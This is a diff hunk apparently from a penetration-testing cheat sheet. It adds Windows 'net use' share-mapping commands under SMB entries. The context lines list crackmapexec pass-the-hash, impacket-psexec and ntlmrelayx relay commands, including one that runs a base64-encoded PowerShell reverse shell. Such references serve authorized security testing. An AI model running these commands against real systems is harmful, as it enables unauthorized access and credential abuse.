@@ -268,6 +268,9 @@ $ crackmapexec smb <IP address> -u <username> -H <hash>
 $ impacket-psexec <username>:'<password>'@<IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address>
 $ impacket-ntlmrelayx --no-http-server -smb2support -t <IP address> -c 'powershell -e <base64 reverse shell>
+C:\> net use n: \\<IP address>\<share name>
+C:\> net use n: \\<IP address>\<share name> /user:<username> <password>
+C:\> dir n: /a-d /s /b | find /c ":\"
 ```
 
 - IMAP (port 143)
